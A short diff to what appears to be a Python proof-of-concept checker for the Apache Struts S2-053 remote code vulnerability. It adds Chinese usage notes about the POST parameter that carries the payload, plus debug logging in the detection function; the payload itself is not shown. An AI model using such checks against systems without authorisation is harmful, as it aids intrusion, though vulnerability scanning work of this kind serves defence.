@@ -11,11 +11,16 @@ Desc
 Version
     Struts 2.0.1 - Struts 2.3.33
     Struts 2.5 - Struts 2.5.10
+Type
+    有回显漏洞
+Usage
+    - 需要指定payload传入的post参数，默认为redirect, 较难检测和利用
 Referer
  - http://struts.apache.org/docs/s2-053.html
  - https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483663&idx=1&sn=6304e1469f23c33728ab5c73692b675e
 """
 import requests
+import logging
 from six.moves.urllib import parse
 
 
@@ -42,7 +47,7 @@ def poc(url):
             if "rivirsirfortest" in resp.text:
                 return True
         except Exception as e:
-            pass
+            logging.debug(e)
     return False
 
 
